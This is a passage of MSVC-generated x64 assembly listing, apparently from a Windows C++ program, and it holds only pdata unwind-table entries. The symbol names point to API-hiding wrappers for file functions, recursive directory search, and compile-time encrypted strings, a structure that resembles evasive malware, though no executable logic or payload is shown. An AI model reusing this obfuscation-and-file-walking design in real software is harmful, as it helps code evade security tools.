$pdata$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z DD imagerel $LN3
	DD	imagerel $LN3+127
	DD	imagerel $unwind$?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+145
	DD	imagerel $unwind$?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pGetLastError@@YAKXZ DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?pGetLastError@@YAKXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pCloseHandle@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pCloseHandle@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pFindClose@@YAHPEAX@Z DD imagerel $LN3
	DD	imagerel $LN3+79
	DD	imagerel $unwind$?pFindClose@@YAHPEAX@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?plstrcmpW@@YAHPEB_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?plstrcmpW@@YAHPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?pStrStrIW@@YAPEB_WPEB_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+91
	DD	imagerel $unwind$?pStrStrIW@@YAPEB_WPEB_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?positive_modulo@@YAHHH@Z DD imagerel $LN3
	DD	imagerel $LN3+74
	DD	imagerel $unwind$?positive_modulo@@YAHHH@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0directory_info_@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$??0directory_info_@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??1directory_info_@@QEAA@XZ DD imagerel $LN3
	DD	imagerel $LN3+44
	DD	imagerel $unwind$??1directory_info_@@QEAA@XZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??_Gdirectory_info_@@QEAAPEAXI@Z DD imagerel $LN4
	DD	imagerel $LN4+82
	DD	imagerel $unwind$??_Gdirectory_info_@@QEAAPEAXI@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z DD imagerel $LN7
	DD	imagerel $LN7+400
	DD	imagerel $unwind$?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+248
	DD	imagerel $unwind$??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z DD imagerel $LN4
	DD	imagerel $LN4+220
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+332
	DD	imagerel $unwind$??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z DD imagerel $LN8
	DD	imagerel $LN8+455
	DD	imagerel $unwind$?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z DD imagerel $LN4
	DD	imagerel $LN4+244
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+92
	DD	imagerel $unwind$??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+248
	DD	imagerel $unwind$??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?CheckDirectory@@YAHPEB_W@Z DD imagerel $LN7
	DD	imagerel $LN7+519
	DD	imagerel $unwind$?CheckDirectory@@YAHPEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+416
	DD	imagerel $unwind$??0?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0CP@$0GJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0FJ@$01U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+500
	DD	imagerel $unwind$??0?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+66
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$01$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+584
	DD	imagerel $unwind$??0?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0HB@$0DA@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1172
	DD	imagerel $unwind$??0?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0GH@$0BN@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+1172
	DD	imagerel $unwind$??0?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAA@PEBE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ DD imagerel $LN3
	DD	imagerel $LN3+51
	DD	imagerel $unwind$?isDecrypted@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEBA_NXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ DD imagerel $LN7
	DD	imagerel $LN7+153
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@QEAAPEBDXZ
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$?encrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z DD imagerel $LN3
	DD	imagerel $LN3+70
	DD	imagerel $unwind$?decrypt@?$MetaBuffer@$0DF@$0HK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@@std@@@@AEBAEE@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z DD imagerel $LN3
	DD	imagerel $LN3+2264
	DD	imagerel $unwind$??0?$MetaBuffer@$04$0HF@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEAA@PEBE@Z
